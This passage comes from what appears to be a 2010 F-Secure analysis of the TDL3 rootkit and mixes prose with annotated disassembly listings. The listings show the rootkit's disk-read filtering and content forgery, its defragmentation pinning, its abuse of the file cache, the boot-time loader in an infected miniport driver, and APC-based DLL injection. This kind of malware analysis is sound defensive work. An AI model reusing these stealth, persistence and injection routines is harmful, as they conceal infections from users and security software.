eax,\n\n[edx+TDL3.MalwareFSOffsetInSector]\n.text:10004B95         jbe   short accessing_protected_sectors\n.text:10004B95\n.text:10004B97         mov   eax, [ecx+SCSI_REQUEST_BLOCK.SrbFlags]\n.text:10004B9A         mov   esi, eax\n.text:10004B9C         shr   esi, 7\n.text:10004B9F         shr   eax, 6\n.text:10004BA2         and   esi, 1\n.text:10004BA5         and   eax, 1     ; get highword\n.text:10004BA8         mov   [ebp+srbflags], eax\n; SRB_FLAGS_DATA_IN |\nSRB_FLAGS_DATA_OUT\n.text:10004BAB         jmp   short internal_scsi_call\n.text:10004BAB\n\n#### Figure XII Filtering SCSI Read and Write\n If the check determines that the requested disk area falls outside the malware’s reserved sectors, the malware issues an IoCompleteRequest and passes the requested data to the caller. \n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n26 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n#### If however the access falls within the malware’s reserved sectors, the malware allocates and initializes a new CompletionRoutine, setting the IO_STACK_LOCATION->Control to 0xe0 (either SL_INVOKE_ON_CANCEL or SL_INVOKE_ON_SUCCESS or SL_INVOKE_ON_ERROR) and calling the Original IRP Major Function. \n\n.text:10004C66\n.text:10004C6B         push  0Ch\n.text:10004C6D         push  edi\n.text:10004C6E         call  eax       ; ExAllocatePool\n.text:10004C6E\n.text:10004C70         cmp   eax, edi\n.text:10004C72         jz   short not_scsi_execute\n.text:10004C72\n.text:10004C74 /*\n.text:10004C74  Allocates a new buffer to setup the malware\n.text:10004C74  completion routine for filtering\n.text:10004C74 */\n.text:10004C74         mov   ecx,\n[ebx+IO_STACK_LOCATION.CompletionRoutine]\n.text:10004C77         mov   [eax], ecx\n.text:10004C79         mov   ecx, [ebx+IO_STACK_LOCATION.Context]\n.text:10004C7C         mov   [eax+4], ecx\n.text:10004C7F         mov   ecx,\n[ebx+IO_STACK_LOCATION.Parameters.Scsi.Srb]\n.text:10004C82         mov   ecx,\n[ecx+SCSI_REQUEST_BLOCK.anonymous_0.InternalStatus]\n.text:10004C85         mov   [eax+8], ecx\n.text:10004C88         mov   [ebx+IO_STACK_LOCATION.Control],\nSL_INVOKE_ON_CANCEL or SL_INVOKE_ON_SUCCESS or SL_INVOKE_ON_ERROR\n.text:10004C8C         mov   [ebx+IO_STACK_LOCATION.Context], eax\n.text:10004C8F         call  ComputeDelta\n.text:10004C8F\n.text:10004C94         add   eax, 0F578291Eh\n.text:10004C99         mov\n[ebx+IO_STACK_LOCATION.CompletionRoutine],\neax\n.text:10004C99\n.text:10004C9C not_scsi_execute:\n.text:10004C9C\n.text:10004C9C         push  [ebp+IRP]\n.text:10004C9F         movzx  eax,\n[ebx+IO_STACK_LOCATION.MajorFunction]\n.text:10004CA2         push  [ebp+DEVICE_OBJECT]\n.text:10004CA5         mov   ecx, ds:0FFDF0308h\n.text:10004CAB         call  dword ptr [ecx+eax*4+8Ch] ;\nCALL_ORIGINAL_IRP_HANDLER\n\n#### Figure XIII Initializing Completion Routine\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n27 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n#### Once the IRP Function finishes – depending on how the flag is set, this can be either Cancelled/Failed or Successful – the malware’s completion routine is triggered and the malware modifies the returned values (zeroes out / or clean the buffer) in order to hide its presence on the disk. \n\n.text:1000491E CompletionRoutine proc near\n.text:1000491E\n.text:1000491E src       = dword ptr -0Ch\n.text:1000491E var_8      = dword ptr -8\n.text:1000491E var_4      = dword ptr -4\n.text:1000491E devobj     = dword ptr 8\n.text:1000491E IRP       = dword ptr 0Ch\n.text:1000491E CONTEXT     = dword ptr 10h\n.text:1000491E\n.text:1000491E         push  ebp\n.text:1000491F         mov   ebp, esp\n.text:10004921         sub   esp, 0Ch\n.text:10004924         push  ebx\n.text:10004925         push  esi\n.text:10004926         mov   esi, [ebp+IRP]\n.text:10004929         cmp   [esi+IRP.IoStatus.anonymous_0.Status],\n0\n.text:1000492D         push  edi\n.text:1000492E         jl   loc_10004A7B\n.text:1000492E\n.text:10004934         mov   edi, [esi+IRP.MdlAddress]\n\nChecks if the operation is using Cache:\n\n.text:10004937         test  byte ptr [edi+_MDL.MdlFlags],\nMDL_MAPPED_TO_SYSTEM_VA or\nMDL_SOURCE_IS_NONPAGED_POOL\n.text:1000493B         jz   short loc_10004942\n.text:1000493B\n.text:1000493D         mov   eax, [edi+_MDL.MappedSystemVa]\n.text:10004940         jmp   short loc_1000495E\n.text:10004940\n.text:10004942 loc_10004942:\n.text:10004942         push  71FF6B1Fh\n; hash: MmMapLockedPagesSpecifyCache\n.text:10004947         call  FindKernel_bySidtCall\n.text:10004947\n.text:1000494C         push  eax\n.text:1000494D         call  FindAPIbyHash\n.text:1000494D\n.text:10004952         push  10h\n.text:10004954         xor   ecx, ecx\n.text:10004956         push  ecx\n.text:10004957         push  ecx\n.text:10004958         push  1\n.text:1000495A         push  ecx\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n28 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n.text:1000495B         push  edi\n.text:1000495C         call  eax       ;\nMmMapLockedPagesSpecifyCache\n.text:1000495E\n\nThen checks which sector is being read/accessed:\n\n.text:1000495E loc_1000495E\n.text:1000495E         mov   ecx, [esi+IRP.IoStatus.Information]\n.text:10004961         mov   edi, ds:0FFDF0308h\n.text:10004967         mov   [ebp+var_4], eax\n.text:1000496A         xor   edx, edx\n.text:1000496C         mov   eax, ecx\n.text:1000496E         div   [edi+TDL3.SectorSize]\n.text:10004974         mov   ebx, [ebp+CONTEXT]\n.text:10004977         mov   edx, eax\n.text:10004979         mov   eax, [ebx+CONTEXT.Dr1]\n.text:1000497C         add   edx, eax\n.text:1000497E         cmp   edx,\n\n[edi+TDL3.MalwareFSOffsetInSector]\n.text:10004981         jbe   short loc_100049C6\n\nIf the malware’s file system is being accessed or read, an empty buffer is\nreturned (the malware zeros out the buffer):\n\n.text:10004983         mov   edx, edi\n.text:10004985         cmp   eax, [edx+40h]\n.text:10004988         jnb   short loc_1000499A\n.text:10004988\n.text:1000498A         mov   esi, [edx+40h]\n.text:1000498D         sub   esi, eax\n.text:1000498F         mov   eax, edi\n.text:10004991         imul  esi, [eax+TDL3.SectorSize]\n.text:10004998         jmp   short zerooutbuffer\n.text:10004998\n.text:1000499A\n.text:1000499A\n.text:1000499A loc_1000499A:\n.text:1000499A         xor   esi, esi\n.text:1000499A\n.text:1000499C\n.text:1000499C zerooutbuffer:\n.text:1000499C         sub   ecx, esi\n.text:1000499E         push  2C655ACDh    ; hash : nt!memset\n.text:100049A3         mov   edi, ecx\n.text:100049A5         call  FindKernel_bySidtCall\n.text:100049A5\n.text:100049AA         push  eax\n.text:100049AB         call  FindAPIbyHash\n.text:100049AB\n.text:100049B0         mov   ecx, [ebp+var_4]\n.text:100049B3         push  edi\n.text:100049B4         add   esi, ecx\n.text:100049B6         push  0\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n29 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n.text:100049B8         push  esi\n.text:100049B9         call  eax       ; memset\n.text:100049B9\n.text:100049BB         mov   esi, [ebp+IRP]\n.text:100049BE         add   esp, 0Ch\n.text:100049C1         jmp   Complete    ;\nCLASSPNP!TransferPktComplete\n.text:100049C1\n.text:100049C6\n\n#### If an area other than the malware’s file system is being accessed, the Trojan consults the list of protected sectors; if a match is found, the Trojan disinfects or returns the buffered data:\n\n.text:100049C6\n.text:100049C6 loc_100049C6:\n.text:100049C6         mov   eax, ds:0FFDF0308h\n.text:100049CB         and   [ebp+var_8], 0\n.text:100049CF         cmp   [eax+TDL3.CountArray], 0\n; Number of Protected Sectors\n.text:100049D6         jbe   Complete    ;\nCLASSPNP!TransferPktComplete\n.text:100049D6\n.text:100049DC         xor   edi, edi\n.text:100049DC\n.text:100049DE\n.text:100049DE loop_entries:\n.text:100049DE         mov   eax, ds:0FFDF0308h\n.text:100049E3         cmp   dword ptr [eax+edi+114h], 0\n; Start of Protected sector Array\n.text:100049EB         jz   short loc_10004A5F\n.text:100049EB\n.text:100049ED         mov   eax, [esi+1Ch]\n.text:100049F0         mov   esi, ds:0FFDF0308h\n.text:100049F6         xor   edx, edx\n.text:100049F8         div   [esi+TDL3.SectorSize]\n.text:100049FE         mov   ecx, [ebx+8]\n.text:10004A01         mov   edx, esi\n.text:10004A03         mov   edx, [edx+edi+114h]\n.text:10004A0A         sub   edx, ecx\n.text:10004A0C         cmp   edx, eax\n.text:10004A0E         jnb   short loc_10004A5C\n.text:10004A0E\n.text:10004A10         mov   eax, esi\n.text:10004A12         mov   ebx, [eax+edi+11Ch]\n.text:10004A19         mov   eax, [eax+edi+120h]\n.text:10004A20         mov   [ebp+src], eax\n; address where the clean data is\nlocated\n.text:10004A23         mov   eax, esi\n.text:10004A25         mov   esi, [eax+edi+114h]\n.text:10004A2C         sub   esi, ecx\n.text:10004A2E         imul  esi, [eax+108h] ; size of sector\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n30 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n.text:10004A35         add   esi, [eax+edi+118h] ; offset from\nsector\n\nReplaces the data in the output buffer with clean data:\n\n.text:10004A3C         push  272F3B77h    ; hash : memcpy\n.text:10004A41         add   esi, [ebp+var_4] ;out buffer\n.text:10004A44         call  FindKernel_bySidtCall\n.text:10004A44\n.text:10004A49         push  eax\n.text:10004A4A         call  FindAPIbyHash\n.text:10004A4A\n.text:10004A4F         push  ebx       ; bytes to copy\n.text:10004A50         push  [ebp+src]\n; offset in Malware Buffer for clean\ndata\n.text:10004A53         push  esi\n.text:10004A54         call  eax       ; memcpy\n.text:10004A54\n\n.text:10004A56         mov   ebx, [ebp+CONTEXT]\n.text:10004A59         add   esp, 0Ch\n.text:10004A59\n.text:10004A5C         mov   esi, [ebp+IRP]\n.text:10004A5C\n.text:10004A5F\n.text:10004A5F loc_10004A5F\n.text:10004A5F         inc   [ebp+var_8]\n.text:10004A62         mov   eax, ds:0FFDF0308h\n.text:10004A67         mov   ecx, [ebp+var_8]\n.text:10004A6A         add   edi, 14h    ; size of struct\n.text:10004A6D         cmp   ecx, [eax+110h] ; counter_chunks of\ndata\n.text:10004A73         jb   loop_entries\n.text:10004A73\n.text:10004A79         jmp   short Complete ;\nCLASSPNP!TransferPktComplete\n.text:10004A79\n.text:10004A7B\n\nFinalize Completion Routine:\n\n.text:10004A7B\n.text:10004A7B loc_10004A7B:\n.text:10004A7B         mov   ebx, [ebp+CONTEXT]\n.text:10004A7B\n.text:10004A7E\n.text:10004A7E Complete:\n.text:10004A7E\n.text:10004A7E         mov   eax, [ebx]   ;\nCLASSPNP!TransferPktComplete\n.text:10004A80         test  eax, eax\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n31 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n.text:10004A82         jz   short loc_10004A90 ; hash : ExFreePool\n.text:10004A82\n.text:10004A84         push  dword ptr [ebx+4] ; context\n.text:10004A87         push  esi       ; irp\n.text:10004A88         push  [ebp+devobj]\n.text:10004A8B         call  eax  ;CLASSPNP!TransferPktComplete\n.text:10004A8B\n.text:10004A8D         mov   [ebp+IRP], eax\n.text:10004A8D\n.text:10004A90\n.text:10004A90 loc_10004A90:\n.text:10004A90         push  730B64BBh    ; hash : ExFreePool\n.text:10004A95         call  FindKernel_bySidtCall\n.text:10004A95\n.text:10004A9A         push  eax\n.text:10004A9B         call  FindAPIbyHash\n.text:10004A9B\n.text:10004AA0         push  ebx\n.text:10004AA1         call  eax ; ExFreePool\n.text:10004AA1\n.text:10004AA3         mov   eax, [ebp+IRP]\n.text:10004AA6         pop   edi\n.text:10004AA7         pop   esi\n.text:10004AA8         pop   ebx\n.text:10004AA9         leave\n.text:10004AAA         retn  0Ch\n.text:10004AAA\n.text:10004AAA CompletionRoutine endp\n\n#### Figure XIV Completion Routine and Content Forgery\n\n VI.7.1 Protecting the Miniport Driver from Defragmentation \n In case the user initiates a defragmentation operation, the malware can protect the infected Miniport driver’s image on the disk from unintended relocation. \n To do so, the malware pins the driver’s sector location to the disk by issuing a ZwFsControlFile with the control code FSCTL_MARK_HANDLE and MARK_HANDLE_INFO structure: \n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n32 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n#### Struct MARK_HANDLE_INFO ( Dword USN_SOURCE_DATA_MANAGEMENT;\n\n Dword hVolume ; // volume handle \n\n Dword MARK_HANDLE_PROTECT_CLUSTERS;\n\n );\n Note: This pinning of clusters is no longer present in the latest TDL3 variants, which instead implement a monitoring thread to ensure the sector-to-memory mapping stays up to date in case the protected sectors are disordered by defragmentation.\n VI.8 File Caching\n TDL3’s content filtering protection mechanism only protects the malware from direct disk access requests. This is generally sufficient as under normal circumstances, direct access requests are infrequent. By default, the system loads frequently used user and system file data in a cache; user requests for these files are then returned with cached data in order to optimize performance and minimize disk access. \n As an additional layer of security, after infecting the filter driver on the disk and installing hooks, the malware will disinfect the driver loaded in the system cache. This is done to exploit the system’s file caching behavior, as any application or user trying to copy/open/edit the Miniport driver will only get the clean cached driver image. The disinfection action does not actually affect the infected image on disk, which is protected by the hooks.\n\n This disinfection strategy effectively prevents the user from realizing the malware is present.\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n33 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n#### Figure XV Disinfection and File Caching\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n34 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n#### VI.9 Infected Driver Code (Loader)\n The entire thrust of the malware Driver’s infection of the Miniport driver is to force it to automatically load the malware’s other components whenever the system is rebooted. As the disk’s drivers are among the first components loaded by the operating system during a reboot, infecting the Miniport drivers ensures TDL3 will be run before any other application – including security programs.\n When the Loader code in the Miniport driver is executed, it calls IoRegisterFsRegistrationChange with the driver entry as a callback function allowing it to resume control after the file system has been loaded. It then calls the original entry point of the infected Miniport driver to resume loading of the file system, thus enabling objects needed by the malware Loader. \n When the infected Miniport driver resumes control, it loads and executes the Driver code on the disk, which in turn executes the other malware components and compromises the system again.\n\n.rsrc:0002688E\n.rsrc:0002688E done_section_rva_check:\n.rsrc:0002688E         mov   eax, 0AB09E7EDh ; delta offset\n.rsrc:00026893         add   eax, [ebp+_54F87F93]\n.rsrc:00026896         push  eax       ; start of\ndriverentry .rsrc:00026897         push  [ebp+DriverObject]\n.rsrc:0002689A         mov   eax, [ebp+OffsMalwareData]\n.rsrc:0002689D         mov   ecx, [ebp+driver_obj_ext]\n.rsrc:000268A0         add   ecx,\n\n[eax+MALWARE_DATA.IoRegisterFsRegistrationChange]\n.rsrc:000268A3 /*\n.rsrc:000268A3  Allows other filter driver to register\n.rsrc:000268A3 */\n.rsrc:000268A3         call  ecx\n.rsrc:000268A3\n\nCalls the Original EntryPoint to allow the Miniport driver to start first:\n\n.rsrc:000268A5         push  [ebp+RegistryPath]\n.rsrc:000268A8         push  [ebp+DriverObject]\n.rsrc:000268AB         mov   eax, [ebp+DriverObject]\n.rsrc:000268AE         mov   eax, [eax+DRIVER_OBJECT.DriverStart]\n.rsrc:000268B1         mov   ecx, [ebp+OffsMalwareData]\n.rsrc:000268B4         add   eax, [ecx+MALWARE_DATA.OrigEP]\n.rsrc:000268B7         call  eax       ; driverstart+3ah\n.rsrc:000268B7\n.rsrc:000268B9         xor   eax, eax\n.rsrc:000268BB         jmp   _exit\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n35 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n.rsrc:000268BB\n.rsrc:000268C5 regpath_1:\n.rsrc:000268C5         mov   eax, 0AB09E7AAh ;\n.rsrc:000268CA         add   eax, 384h\n.rsrc:000268CF         sub   eax, 0AB09B000h\n.rsrc:000268D4         add   eax, 1FFh\n.rsrc:000268D9         and   eax, 0FFFFFE00h\n.rsrc:000268DE         push  eax       ;\n.rsrc:000268DF eax=0x3c00\n.rsrc:000268DF         push  0\n.rsrc:000268E1         mov   eax, 308h\n.rsrc:000268E6         mov   eax, [eax+0FFDF0000h] ; 0xffdf0308\n.rsrc:000268EC eax=0xffdf0308\n.rsrc:000268EC         mov   eax, [eax+4]  ; NT_BASE\n.rsrc:000268EF         mov   ecx, [ebp+OffsMalwareData]\n.rsrc:000268F2         add   eax, [ecx+MALWARE_DATA.ExAllocatePool]\n.rsrc:000268F5         call  eax       ; ExAllocatePool\n.rsrc:000268F5\n.rsrc:000268F7         mov   ecx, 308h\n.rsrc:000268FC         mov   ecx, [ecx+0FFDF0000h]\n.rsrc:00026902 eax=0xffdf0308\n.rsrc:00026902         mov   [ecx], eax   ; ecx = TDL3 Buffer\n.rsrc:00026904         mov   eax, 308h\n.rsrc:00026909         mov   eax, [eax+0FFDF0000h]\n.rsrc:0002690F eax=0xffdf0308\n.rsrc:0002690F         mov   eax, [eax+0E4h]\n.rsrc:00026915         mov   eax, [eax+4]\n.rsrc:00026918         mov   [ebp+_OBJECT], eax\n.rsrc:0002691B loc_2691B:\n.rsrc:0002691B         cmp   [ebp+_OBJECT], 0\n.rsrc:0002691F         jz   loc_26AB5\n.rsrc:0002691F\n.rsrc:00026925         lea   eax, [ebp+var_24]\n.rsrc:00026928         push  eax\n.rsrc:00026929         push  104h      ; length\n.rsrc:0002692E         lea   eax, [ebp+OBJECT_NAME_INFORMATION]\n.rsrc:00026934         push  eax\n.rsrc:00026935         push  [ebp+_OBJECT]\n.rsrc:00026938         mov   eax, 308h\n.rsrc:0002693D         mov   eax, [eax+0FFDF0000h] ; FFDF0308\n.rsrc:00026943         mov   eax, [eax+4]  ; NT_BASE\n.rsrc:00026946         mov   ecx, [ebp+OffsMalwareData]\n.rsrc:00026949         add   eax,\n\n[ecx+MALWARE_DATA.ObQueryNameString]\n.rsrc:0002694C         call  eax\n.rsrc:0002694C\n.rsrc:0002694E         test  eax, eax\n.rsrc:00026950         jl   loc_26AA7\n.rsrc:00026950\n\nReads TDL3_CODE_BUFFER from end of Disk:\n\n.rsrc:00026956         mov   eax, [ebp+OffsMalwareData]\n.rsrc:00026959         mov   ecx, [eax+MALWARE_DATA.diskoffset_low]\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n36 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n.rsrc:0002695B         mov   [ebp+diskofs_low], ecx ; 38B2A200\n.rsrc:00026961         mov   eax,\n\n[eax+MALWARE_DATA.diskoffset_high]\n.rsrc:00026964         mov   [ebp+diskofs_high], eax ; val_2\n.rsrc:0002696A         mov   [ebp+var_0x18], 18h\n.rsrc:00026974         and   [ebp+var_0x0], 0\n.rsrc:0002697B         mov   [ebp+var_0x240], 240h\n.rsrc:00026985         lea   eax, [ebp+OBJECT_NAME_INFORMATION]\n.rsrc:0002698B         mov   [ebp+_var_130], eax\n.rsrc:00026991         and   [ebp+_var_0x0], 0\n.rsrc:00026998         and   [ebp+__var_0x0], 0\n.rsrc:0002699F         push  22h\n.rsrc:000269A1         push  3\n.rsrc:000269A3         lea   eax, [ebp+IOStatusBlock]\n.rsrc:000269A9         push  eax\n.rsrc:000269AA         lea   eax, [ebp+var_0x18]\n.rsrc:000269B0         push  eax\n.rsrc:000269B1         push  100003h\n.rsrc:000269B6         lea   eax, [ebp+fhandle]\n.rsrc:000269BC         push  eax\n.rsrc:000269BD         mov   eax, 308h\n.rsrc:000269C2         mov   eax, [eax+0FFDF0000h]\n.rsrc:000269C8 eax=0xffdf0308\n.rsrc:000269C8         mov   eax, [eax+4]  ; NT_BASE\n.rsrc:000269CB         mov   ecx, [ebp+OffsMalwareData]\n.rsrc:000269CE         add   eax, [ecx+MALWARE_DATA.ZwOpenFile]\n.rsrc:000269D1         call  eax\n.rsrc:000269D1\n.rsrc:000269D3         test  eax, eax\n.rsrc:000269D5         jl   loc_26AA7\n.rsrc:000269D5\n.rsrc:000269DB         push  0\n.rsrc:000269DD         lea   eax, [ebp+diskofs_low]\n.rsrc:000269E3         push  eax\n.rsrc:000269E4         mov   eax, 0AB09E7AAh\n.rsrc:000269E9         add   eax, 384h    ; offset of malware\ncode from buffer\n.rsrc:000269EE         sub   eax, 0AB09B000h\n.rsrc:000269F3         add   eax, 1FFh\n.rsrc:000269F8         and   eax, 0FFFFFE00h ;\n.rsrc:000269FD         push  eax       ; length\n.rsrc:000269FE\n.rsrc:000269FE         mov   eax, 308h\n.rsrc:00026A03         mov   eax, [eax+0FFDF0000h]\n.rsrc:00026A09 eax=0xffdf0308\n.rsrc:00026A09         push  dword ptr [eax+0] ; 0xffdf0308 = TDL3\nbuffer\n.rsrc:00026A0B         lea   eax, [ebp+IOStatusBlock]\n.rsrc:00026A11         push  eax\n.rsrc:00026A12         push  0\n.rsrc:00026A14         push  0\n.rsrc:00026A16         push  0\n.rsrc:00026A18         push  [ebp+fhandle]\n.rsrc:00026A1E         mov   eax, 308h\n.rsrc:00026A23         mov   eax, [eax+0FFDF0000h]\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n37 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n.rsrc:00026A29 eax=0xffdf0308\n.rsrc:00026A29         mov   eax, [eax+4]\n.rsrc:00026A2C         mov   ecx, [ebp+OffsMalwareData]\n.rsrc:00026A2F         add   eax, [ecx+MALWARE_DATA.ZwReadFile]\n.rsrc:00026A32         call  eax\n.rsrc:00026A32\n.rsrc:00026A34         test  eax, eax\n.rsrc:00026A36         jl   short loc_26AA7\n.rsrc:00026A36\n.rsrc:00026A38         mov   eax, 308h\n.rsrc:00026A3D         mov   eax, [eax+0FFDF0000h]\n.rsrc:00026A43 eax=0xffdf0308\n.rsrc:00026A43         mov   eax, [eax+0]\n\nChecks signature to validate data:\n\n.rsrc:00026A45         cmp   dword ptr [eax+0], ‘3LDT’\n.rsrc:00026A4B         jnz   short loc_26AA7\n.rsrc:00026A4D         mov   eax, [ebp+_54F87F93]\n.rsrc:00026A50         add   eax, 0AB09E7EDh\n.rsrc:00026A55         push  eax\n.rsrc:00026A56         mov   eax, 308h\n.rsrc:00026A5B         mov   eax, [eax+0FFDF0000h]\n.rsrc:00026A61 eax=0xffdf0308\n.rsrc:00026A61         push  dword ptr [eax+0E4h]\n.rsrc:00026A67         mov   eax, 308h\n.rsrc:00026A6C         mov   eax, [eax+0FFDF0000h]\n.rsrc:00026A72 eax=0xffdf0308\n.rsrc:00026A72         mov   eax, [eax+4]\n.rsrc:00026A75         mov   ecx, [ebp+OffsMalwareData]\n.rsrc:00026A78         add   eax,\n\n[ecx+MALWARE_DATA.IoUnregisterFsRegistrationChange]\n.rsrc:00026A7B         call  eax\n\nCalls malware code from TDL3_CODE_BUFFER:\n\n.rsrc:00026A7D         push  [ebp+_OBJECT]\n.rsrc:00026A80         mov   eax, 308h\n.rsrc:00026A85         mov   eax, [eax+0FFDF0000h]\n.rsrc:00026A8B eax=0xffdf0308\n.rsrc:00026A8B         push  dword ptr [eax+0E4h]\n.rsrc:00026A91         mov   eax, 308h\n.rsrc:00026A96         mov   eax, [eax+0FFDF0000h]\n.rsrc:00026A9C         mov   eax, [eax+0]\n.rsrc:00026A9E         add   eax, 384h\n.rsrc:00026AA3         call  eax       ; call malware driver\ncode .rsrc:00026AA3\n.rsrc:00026AA5         jmp   short _exit\n\n.rsrc:00026AD0 start_data MALWARE_DATA <38B2A200h, 3Ah, 159F7h, 60008h,\n2964Ch, 29B88h, 0ED9B8h, 9D83Ch, 9DE20h, 0, 0, 1CD25h>\n\n#### Figure XVI Loader Code (Disassembly)\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n38 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n#### VI.10 Process Injection\n When the Driver code executes, it in turns executes the other malware components. This includes the two user-mode payload modules, tdlcmd.dll and tdlwsp.dll. The injection targets of the modules are specified in the configuration file: \n [injector]  svchost.exe = tdlcmd.dll\n * = tdlwsp.dll\n The configuration information indicates that when the process svchost is launched, tdlcmd.dll will be injected into it; whereas the ‘*’ means that any other process executed is injected with tdlwsp.dll.\n To perform the injection, the driver adds a LoadImageNotifyRoutine. This routine checks if “kernel32.dll” is loaded/imported by the process, then creates an APC routine that queues a WorkerRoutine. It then reads the config.ini to check which component to inject, based on the process image name being launched. \n\n.text:10005324 LoadImageNotifyHandler proc near\n.text:10005324 var_28     = word ptr -28h\n.text:10005324 var_26     = word ptr -26h\n.text:10005324 var_24     = word ptr -24h\n.text:10005324 var_22     = word ptr -22h\n.text:10005324 var_20     = word ptr -20h\n.text:10005324 var_1E     = word ptr -1Eh\n.text:10005324 var_1C     = word ptr -1Ch\n.text:10005324 var_1A     = word ptr -1Ah\n.text:10005324 var_18     = word ptr -18h\n.text:10005324 var_16     = word ptr -16h\n.text:10005324 var_14     = word ptr -14h\n.text:10005324 var_12     = word ptr -12h\n.text:10005324 var_10     = word ptr -10h\n.text:10005324 var_E      = word ptr -0Eh\n.text:10005324 var_8      = byte ptr -8\n.text:10005324 curr_thread   = dword ptr 8\n.text:10005324 arg_8      = dword ptr 10h\n.text:10005324\n.text:10005324         push  ebp\n.text:10005325         mov   ebp, esp\n.text:10005327         sub   esp, 28h\n.text:1000532A         push  esi\n.text:1000532B         xor   esi, esi\n.text:1000532D         cmp   [ebp+curr_thread], esi\n.text:10005330         jz   not_found\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n39 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\nChecks if KERNEL32 is imported:\n\n.text:10005336         push  5E35B3F4h    ; hash :\nRtlInitUnicodeString\n.text:1000533B         mov   [ebp+var_28], '*'\n.text:10005341         mov   [ebp+var_26], '\\'\n.text:10005347         mov   [ebp+var_24], 'K'\n.text:1000534D         mov   [ebp+var_22], 'E'\n.text:10005353         mov   [ebp+var_20], 'R'\n.text:10005359         mov   [ebp+var_1E], 'N'\n.text:1000535F         mov   [ebp+var_1C], 'E'\n.text:10005365         mov   [ebp+var_1A], 'L'\n.text:1000536B         mov   [ebp+var_18], '3'\n.text:10005371         mov   [ebp+var_16], '2'\n.text:10005377         mov   [ebp+var_14], '.'\n.text:1000537D         mov   [ebp+var_12], 'D'\n.text:10005383         mov   [ebp+var_10], 'L'\n.text:10005389         mov   [ebp+var_E], 'L'\n.text:1000538F         mov   [ebp-0Ch], si\n.text:10005393         call  FindKernel_bySidtCall\n.text:10005393\n.text:10005398         push  eax\n.text:10005399         call  FindAPIbyHash\n.text:10005399\n.text:1000539E         lea   ecx, [ebp+var_28]\n.text:100053A1         push  ecx\n.text:100053A2         lea   ecx, [ebp+var_8]\n.text:100053A5         push  ecx\n.text:100053A6         call  eax       ; RtlInitUnicodeString\n.text:100053A6\n.text:100053A8         push  0CCD9AAAFh   ; hash :\nFsRtlIsNameInExpression\n.text:100053AD         call  FindKernel_bySidtCall\n.text:100053AD\n.text:100053B2         push  eax\n.text:100053B3         call  FindAPIbyHash\n.text:100053B3\n.text:100053B8         push  esi\n.text:100053B9         push  1\n.text:100053BB         push  [ebp+curr_thread]\n.text:100053BE         lea   ecx, [ebp+var_8]\n.text:100053C1         push  ecx\n.text:100053C2         call  eax       ;\nFsRtlIsNameInExpression\n.text:100053C2\n.text:100053C4         test  al, al\n.text:100053C6         jz   not_found\n.text:100053C6\n\nSets APC Function to LoadLibrary:\n\n.text:100053CC         mov   eax, ds:0FFDF0308h\n.text:100053D1         push  edi\n.text:100053D2         lea   edi, [eax+TDL3.LoadLibraryExA]\n.text:100053D8         cmp   [edi], esi\n\n\n© 2010 F-SECURE CORPORATION. ALL RIGHTS RESERVED.\n\n\n40 / 53\n\n\n-----\n\nTHE CASE OF A [T]ROJAN [D]OWN[L]OADER\n\n.text:100053DA         jnz   short loc_100053EE\n.text:100053DA\n\n.text:100053EE loc_100053EE:              ; CODE XREF:\nLoadImageNotifyHandler+B6j\n.text:100053EE         push  ebx\n.text:100053EF         push  0DE45E96Ch   ; hash :\nExAllocatePool\n.text:100053F4         call  FindKernel_bySidtCall\n.text:100053F4\n.text:100053F9         push  eax\n.text:100053FA         call  FindAPIbyHash\n.text:100053FA\n.text:100053FF         push  30h\n.text:10005401         push  esi\n.text:10005402         call  eax       ; ExAllocatePool\n.text:10005402\n.text:10005404         mov   ebx, eax\n.text:10005406         cmp   ebx, esi\n.text:10005408         jz   short loc_1000545E\n.text:10005408\n.text:1000540A         push  6A85FB87h    ; hash :\nnt!__KeGetCurrentThread\n.text:1000540F         call  FindKernel_bySidtCall\n.text:1000540F\n.text:10005414         push  eax\n.text:10005415         call  FindAPIbyHash\n.text:10005415\n.text:1000541A         call  eax       ; __KeGetCurrentThread\n.text:1000541A\n.text:1000541C         mov   [ebp+curr_thread], eax\n.text:1000541F         call  ComputeDelta\n.text:1000541F\n.text:10005424         mov   edi, eax\n.text:10005426         push  0D79E0B0Ah   ; nt!KeInitializeApc\n.text:1000542B         add   edi, 0F5782F4Fh ; 